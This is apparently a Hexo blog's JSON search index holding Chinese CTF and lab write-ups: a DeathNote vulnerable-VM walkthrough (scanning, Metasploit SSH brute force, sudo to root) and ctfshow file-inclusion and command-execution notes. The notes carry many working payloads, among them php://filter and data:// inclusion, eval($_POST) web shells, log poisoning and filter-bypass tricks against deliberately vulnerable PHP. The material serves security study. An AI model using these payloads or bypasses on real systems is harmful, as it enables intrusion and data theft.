{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Mini Full","url":"http://example.com","root":"/"},"pages":[{"title":"404","date":"2021-11-05T10:15:10.000Z","updated":"2021-11-05T10:16:37.893Z","comments":false,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"about","date":"2021-11-05T10:08:34.000Z","updated":"2021-11-05T10:09:07.176Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-11-05T09:49:44.000Z","updated":"2021-11-11T02:46:28.767Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-11-05T10:13:49.000Z","updated":"2021-11-05T10:13:49.522Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-11-05T09:39:57.000Z","updated":"2021-11-11T02:46:13.564Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"DeathNote靶机渗透过程","slug":"DeathNote靶机渗透过程","date":"2021-11-24T02:02:19.000Z","updated":"2021-11-24T09:01:37.254Z","comments":true,"path":"2021/11/24/DeathNote靶机渗透过程/","link":"","permalink":"http://example.com/2021/11/24/DeathNote%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/","excerpt":"","text":"DeathNote靶机渗透过程准备环境攻击机：Kali-Linux-2021.3 目标靶机：Deathnote 平台：VMware Workstation Pro 15.6 难度：easy 均为 NAT 模式 一、信息搜集1.主机嗅探kali和DeathNote处于同一网段，查看kali当前IP` 1ifconfig 可知kali的IP地址为192.168.239.184/24，进行网段扫描 1netdiscover -r 192.168.239.0/24 扫描结果显示靶机的IP地址为192.168.239.186 注释：在同为NAT模式下，无法扫描出IP，不妨试试进入靶机的拯救模式 具体方法可以看：https://app.yinxiang.com/fx/d0e7d6f3-305d-457c-b10a-f3080d438617 2.端口扫描1nmap -sS 192.168.239.168 这里可以看到靶机开放了22和80端口 二、漏洞挖掘1.dirb扫描网站目录​ 1.首先使用dirb对网站的特殊文件进行扫描。 1dirb http://192.168.239.186 -X .txt,.html,.php,.bak,.bac,.sql,.php.bac,.jpg ​ 扫描到三个文件 ​ 2.我们使用dirb对网站目录进行扫描。 1dirb http://192.168.239.168 -r 2.访问其web页面信息1 访问网站80端口，192.168.239.186:80, ​ 之后跳转到 http://deathnote.vuln/wordpress/ 跳转到一个无法正常打开的页面，我们需要修改本机的hosts文件，手动将这个不存在的网页指向靶机 1vi /etc/hosts 注释：实际添加内同以实际情况为准，环境不同，IP不同 返回刷新浏览器 信息2 访问http://192.168.239.186/robots.txt。这里提示有一个**important.jpg**,还有用户**ryuk** 信息3 访问图片路径，试着打开图片，发现网页无法显示，所以把它下载下来 1wget http://192.168.239.186//important.jpg 打开图片，它显示一段文字，这里出现了名字有Soichiro Yagami，light，kira。并且提供了用户名：user.txt。并且提示密码在网站的提示页。 因此，我们点击网页上的HINT,点开后提示，咋回到server上的note.txt或者看L的留言。L的留言应该指的就是下面的“my fav line is iamjustic3” 3.WordPress后台登陆经过多次尝试，我使用用户名：kira，密码：iamjustic3成功登陆了wp后台 根据提示，我们现在需要找到note.txt 在 侧边栏—&gt;Media—&gt;Library，可看到notes.txt 下载下来 1wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt 查看notes.txt文件 1cat notes.txt 可以发现，notes.txt是个字典文件，可用于ssh登陆 三、漏洞利用1.SSH爆破启动msf6 1msfconsole 使用SSH_login模块、 1use auxiliary/scanner/ssh/ssh_login 查看当前选项列表 1show options 设置密码字典 1set pass_file ./notes.txt 设置目标主机 1set rhost 192.168.239.186 设置用户名，尝试用户名为l 1set username l 开始爆破 1run 爆破完成，用户名：l,密码death4me 2.SSH远程登陆使用刚刚爆破出的用户名和密码进行SSH连接 123ssh l@192.168.239.186yesdeath4me 3.提权检查当前用户 l 的权限 1sudo l 提示该用户不存在 sudoers列表中 查看当前家目录的文件列表 1ls -lha 存在user.txt文件，查看该文件，发现是BrainFuck编码 进行解码，在线工具：https://ctf.bugku.com/tool/brainfuck 查看 /home目录下有哪些用户 1ls /home -lha 进入kira的家目录，查看文件列表 1cd /home/kira &amp;&amp; ls -lha 发现存在 kira.txt文件，但是没有 l并没有权限查看 继续在靶机中寻找其他有价值的信息，发现在/opt下存在名为L的目录，查看L目录下的内容 1cd /opt/L &amp;&amp; ls -lha 进入到kira-case目录，发现有个名为case-file.txt文件，查看该文件内容 1cd ./kira-case &amp;&amp; cat case-file.txt 最后一句话，在提示 fake-notebook-rule目录下有我们想要得到的内容，切换至 fake-notebook-rule目录 1cd ../fake-notebook-rule &amp;&amp; ls -lha 里面存在两个文件，case.wav和 hine 查看case.wav内容 1cat case.wav 内容是一串16进制编码 查看hint内容 1cat hint 根据提示我们使用cyberchef进行编码 在左侧侧边栏拖拽From Hex(来自16进制)到Recipe模块，在Input模块中输入那串16进制编码，Output模块中就会输出结果，由输出结果可知结果又为一串Base64编码，再从侧边栏拖入From Base64模块到Recipe模块，Output模块中就会输出解码后的内容，内容为passwd : kiraisevil 尝试切换至用户kira 查看用户 kira的权限 1sudo -l 用户 kira可执行所有命令 查看kira家目录列表 1cd ~ &amp;&amp; ls -lha 查看 kira.txt 1cat kira.txt 发现又是一串 base64编码，进行解码查看内容 可得知还有一个目录/var里面有可用信息，切换到该目录 1cd /var &amp;&amp; cat misa 貌似没有什么有用的信息 刚才通过查看 kira的权限，得知用户kira能执行任何命令，可通过kira直接拿到 rootshell 1sudo su 已切换到 root用户，查看 /root目录下的内容 1cd /root &amp;&amp; cat root.txt 目标靶机渗透结束","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"文件包含","slug":"文件包含","date":"2021-11-21T02:48:22.000Z","updated":"2021-11-21T06:04:10.594Z","comments":true,"path":"2021/11/21/文件包含/","link":"","permalink":"http://example.com/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"web78源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 10:52:43# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 首先这是一个 file 关键字的get参数传递， php:// 是一种协议名称(命令执行web37中也有简单介绍)， php://filter/ 是一种访问本地文件的的协议， /read=convert.base64-encode/ 表示读取的方式是base64编码， resource=index.php 表示目标文件名为index.php。 ​ 通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include()函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。 ​ 而include的内容是由用户控制的，所以通过我们传递的 file 参数，是 include() 函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。 所以最终的payload如下： 1?file=php://filter/convert.base64-encode/resource=flag.php flag: web79源码： 123456789101112131415161718192021&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:10:14# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了 php ，所以可以使用 data:// 协议进行绕过： 123?c=file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;// 一下是 POST 数据1=system(&quot;tac falg.php&quot;); ​ 或者也可以使用下面的方法： 12/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;); flag: web80源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow命令执行笔记","slug":"命令执行","date":"2021-11-14T08:36:03.000Z","updated":"2021-11-18T11:21:47.456Z","comments":true,"path":"2021/11/14/命令执行/","link":"","permalink":"http://example.com/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"web29源码： 1234567891011121314151617181920212223&lt;php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析考点： 这题中看到两个函数 ​ eval() ​ preg_match 通过百度可知 ​ eval() 函数的功能是获取返回值 ​ preg_match 是执行正则表达式，在题中是起到一个过滤的作用。 解题： ​ 在代码中，我们可以看到过滤了 flag 而且不区分大小写 12345所需要使用的知识点 通配符 1. * 可以匹配0或多个字符 2. ? 可以匹配任意一个字符 3. [abcd] 匹配abcd中任何一个字符 4. [a-z] 匹配范围a到z，表示范围的意思 []匹配中括号中的任意一个字符 ​ 所以在这 flag 可以用 f* 或 f??? 代替 ​ 所以这个题的payload 123?c=system(&quot;cat f*.php&quot;);?c=system(&quot;cat f*&quot;);?c=system(&quot;cat f???.php&quot;); ​ 也可以使用 cp 命令 12?c=system(&quot;cp fla?.php 1.txt&quot;); //意思就是复制flag.php文件 明名为 1.txturl/1.txt //然后查看1.txt ​ 再补充一个，绕过可以用引号，反斜杠 1flag=fl\\ag=fl&#x27;&#x27;ag flag: web30源码： 1234567891011121314151617181920&lt;php/*# -*- coding: utf-8 -*-# @Author: hlxa# @Date: 2020-09-04 00:12:34# @Last: Modified by: hlxa# @Last: Modified time: 2020-09-04 00:42:36# @email: hlxa@ctfer.com# @link: http://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125;&#125; 分析： ​ 过滤了 flag,system,php关键字 1所需知识点反引号执行命令 ​ 因为过滤掉了 system，我们就得选择其他的命令执行函数 ​ 最常用的无需 echo 121. system();2. passthru(); ​ 需用 echo 函数 1231. 反引号 — `` 有 system() 的作用2. exec();3. shell_exec(); 实验： ​ 较上题比较，这题过滤多了 system 和 php ​ 所以 flag.php 中php可以使用 p?p 或 p* 代替 payload: 1234?c=passthru(&quot;cat fl&#x27;&#x27;ag.p?p&quot;);?c=echo (`cat fl&#x27;&#x27;ag.p?p`);?c=exec(`cp fl* 1.txt`); //然后接着访问 url/1.txt?c=shell_exec(&quot;cp f* 2.txt&quot;); //然后让问 url/2.txt flag: web31源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这道题比之前的题多过滤了 cat,sort,shell,反斜杠(\\),空格,点(.) 1cat 过滤时，可以代替绕过的姿势 tac: 从最后一行开始显示，是 cat 的反向显示 more: 一页一页的显示档案内容 less: 与 more 类似 head: 查看文档的前几行 tail: 查看文档的后几行 nl: 显示的时候，顺便输入行号 od: 以二进制的方式读取文档内容 vi: 一种编辑器 uniq: 查看 vim: 一种编译器 1空格过滤时，可以代替绕过的姿势 ${IFS} $IFS$1 ${IFS %20 &lt; 和 &lt;&gt; 重定向符 %09 实验： ​ 这道题过滤把主要的空格给过滤了，所以需要添加一个空格过滤符号。 ​ 这题的payload: 1234?c=echo(`more%09f*`); //more也可以写成less,nl,uniq,tac?c=passthru(&quot;tac%09f*&quot;); //tac也可以写成less,nl,uniq,more?c=echo`strings%09f*`;?c=&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;nl%09fl*&quot;); //等价于system。这个学到了! nl同样可以替换为more,less,uniq,tac,strings flag web32源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 又过滤了 shell,单引号(‘),反引号(`),echo,分号(;),括号(()) ​ 分号可以使用 ?&gt; 代替，括号可以使用 “” 绕过，所以使用文件包含的方式 实验： ​ 所以 payload 为： 1?c=include&quot;$_GET[1]&quot;?&gt;&amp;=php://filter/read=convert.base64-encode/resource=falg.php ​ 这题还可以使用伪协议 12?c=include&quot;$_POST[1]&quot;?&gt;1=php://filter/read=convert.base64-encode/resource=flag.php flag: 再使用 base64 工具转换就可以得到 flag 值 web33源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 02:22:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*///error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题过滤多了双引号，所以在上一题 payload 的基础上，去掉双引号即可 实验： payload1 1?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php payload2 12?c=include$_POST[1]?&gt;1=php://filter/read=convert.base64-encode/resource=flag.php flag: web34多过滤了 : payload同web33 web35多过滤了 = 和 &lt; payload同web33 web36过滤掉了数字，把1换成字母就可 web37— 日志shell源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题考的是一个协议问题，所以介绍一下各个协议的用法 12345678910111213file://协议用于访问本地文件，在CTF中通常用来读取本地文件示例： http://127.0.0.1/include.php?file://读取的路径php://协议php://访问各个输入/输出流，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码示例1： php://filter/read=convert.base64-encode/resource=[文件名]示例2： http://127.0.0.1/include.php?file=php://input [POST DATA部分] &lt;?php phpinfo(); ?&gt; //现在不太能理解，先放着后面学习。data://协议通常可以用来执行PHP代码示例1： http://127.0.0.1/include.php?file=data://text/plain,命令&lt;?php%20phpinfo();?&gt;示例2： http://127.0.0.1/include.php?file=data://text/plain;base64,base64编码搬运的：https://www.cnblogs.com/z1ten9/p/14360476.html 实验： payload1： 12?c=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;&lt;?php system(&quot;ls&quot;);?&gt; base64形式为 PD9waHAgc3lzdGVtKCdscycpOz8+ 因为题目中过滤了 flag,所以使用 base64 编码可以实现绕过 1?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg== payload2 利用日志： 1. 首先在 url 中添加一句话木马，让其记录到服务器中的日志文件中，此次题目的环境日志路径为：/var/log/nginx/access.log 1?c=&lt;?php @eval($_POST[1]);?&gt; ​ 2.访问日志文件，查看是否多了一句话木马： 蚁剑 or 中国菜刀 类似工具连接：但是失败了 flag: web38—日志shell源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 比较上题过滤多了 php,file ​ 所以 &lt;?php 写为 &lt;?= 实验： payload1: 1?c=data://text/plain,&lt;?=system(&quot;ls&quot;);?&gt; 1?c=data://text/plain;base64,PD89IHN5c3RlbSgidGFjIGYqIik7Pz4= web39源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:13:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题过滤了 flag ,然后限制了后缀不能为 php,但是使用 data:// 协议不受过滤的影响 实验： 1. 仍然使用 data:// 协议； ls 查看目录 1?c=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt; ​ 12// cat 所有 f开头的文件?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt; ​ web40源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了 [0-9]数字，~，·，@, #, $, ^, &amp;, *, 中文括号（），-, =, +, {},[], : , ’ , “, 逗号, &lt; &gt;, 小数点, ./, ? ,一大堆 ​ 根据提示给出 payload 是使用无参数函数进行文件读取 实验： 12?c=print_r(localeconv());//localeconv() 返回包含本地数字及货币格式信息的数组其中包含小数点，正好题目过滤了小数点 12?c=print_r(pos(localeconv()));// pos() 获取数组中当前元素的值---&gt; 12?c=print_r(scandir(pos(localeconv())));// scandir() 返回指定目录中的文件和目录的数组---&gt; 此时获取到的数组下标为 1 的为 .. 12?c=print_r(array_reverse(scandir(pos(localeconv()))));// array_reverse() 翻转数组--&gt;将 scandir() 获取到的数组下标 1 的变为 flag.php 12?c=print_r(next(array_reverse(scandir(pos(localeconv())))));// next() 函数将内部指针指向数组中的下一个元素，并输出。即下一个 ———&gt; flag.php；如若在上一步 array_reverse() 不翻转将得到： .. 此时已经读取到了 flag.php 那么就要将其内容显示出来： 可以使用 show_source() 或者 highlight_file() 得到flag 12?c=show_source(next(array_reverse(scandir(pos(localeconv())))));?c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); flag: web41web42 — &gt;/dev/null 2&gt;&amp;1源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 20:51:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： /dev/null /dev/null 表示的是一个黑洞，通常用于丢弃不需要的数据输出，或者用于输入流的文件 /dev/null 作用是将标准输出重定向到 /dev/null 中。 /dev/null 代表Linux的空设备文件，往这个文件里面写入的内容都会丢失:”黑洞” 所以执行了 &gt;dev/null 之后，标准输出掉入黑洞不复存在。 2&gt;&amp;1 重定向绑定，&amp;可以将两个输出绑定在一起。所以错误输出将和标准输出同一个文件描述。 一次 &gt;/dev/null 2&gt;&amp;1 执行后：标准输出重定向到/dev/null(黑洞)中,错误输出重用来标准输出的描述，因此也掉入了黑洞。综上所述，该条命令执行后，不会有任何显示，不会输出任何信息到控制台，也不会有任何信息输出到文件中。 所以此题要把 &gt;/dev/null 2&gt;&amp;1 这部分内容截断: 12345?c=cat flag.php; // cat可以替换为 tac，nl,more，less，uniq，tail,下面的几个 flag 同样适用?c=cat flag.php%0a // %0a = 回车?c=cat flag.php%26 // %26 = &amp;?c=cat flag.php%26%26 // %26%26 = &amp;&amp;?c=cat flag.php|| // || = || flag: web43源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题较上题，多过滤了分号(;)和cat，所以在构建payload的时候，可以不使用分号(;),cat可以使用ca’’t，或者不适用cat 实验： ​ payload： 1234?c=tac flag.phh%0a //%0a = 回车?c=tac flag.phh%26 // %26 = &amp;?c=tac flag.php|| // || = ||// 题中的 tac 还可以替换为less,more,c&#x27;&#x27;at,nl,uniq flag: web44源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题在上一题的基础上多过滤了一个 flag，因此，在构建payload的时候，flag可以使用 f?ag.php ，fl’’ag.php 或 f* 代替 实验： ​ payload： 123?c=tac fl&#x27;&#x27;ag.php|| //tac 可以替换为more less nl uniq c&#x27;&#x27;at flag 可以替换为 **f?ag.php** ，**fl&#x27;&#x27;ag.php** 或 **f*** ?c=more fl&#x27;&#x27;ag.php%26 // %26 = &amp;?c=more fl&#x27;&#x27;ag.php%0a // %0a = 回车 flag: web45源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:35:34# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上过了一个空格 ​ 空格的代替姿势在 web31 中讲过，有需要的可以翻看 ​ cat 和 flag 的过滤同样可以使用上一题的方法 实验： ​ payload： 1234?c=tac&lt;fl&#x27;&#x27;ag.php||?c=more$IFS$1f???.php%0a?c=less%09f*%26?c=uniq$&#123;IFS&#125;f?ag.php%26%26 flag: web46源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:50:19# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： 在上题的基础上，多过滤了数字(0-9),$,* ,也就意味着我们在绕过空格的时候没办法使用${IFS}，$IFS$1和${IFS，绕过flag 的时候不能使用 f*，其他都是和之前一样的 实验： ​ payload： 123?c=tac&lt;fl&#x27;&#x27;ag.php||?c=more%09fl&#x27;&#x27;ag.php%26?c=less&lt;&gt;fl&#x27;&#x27;ag.php%0a web47源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:59:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： 这题在上一题的基础上，多过滤了 more，less，head，sort，tail ，却没过滤 tac，nl，uniq 实验： ​ payload 123?c=uniq&lt;fl&#x27;&#x27;ag.php||?c=tac&lt;&gt;fl&#x27;&#x27;ag.php%0a?c=nl%09fl&#x27;&#x27;ag.php%26 flag: web48源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:06:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上，过滤更多了 cut，tail，sed，awk，strings，curl，od，`，head 发现还是没过滤tac，nl和uniq，所以继续使用上一题的payload 实验： ​ payload： 123?c=uniq&lt;fl&#x27;&#x27;ag.php||?c=tac&lt;&gt;fl&#x27;&#x27;ag.php%0a?c=nl%09fl&#x27;&#x27;ag.php%26 flag: web49源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:22:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题在上题的基础上又过滤了百分号(%) ，其他也没过滤，同样使用之前的方法 实验： ​ payload： 123?c=uniq&lt;fl&#x27;&#x27;ag.php||?c=tac&lt;&gt;fl&#x27;&#x27;ag.php%0a?c=nl%09fl&#x27;&#x27;ag.php%26 flag: web50源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:32:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| 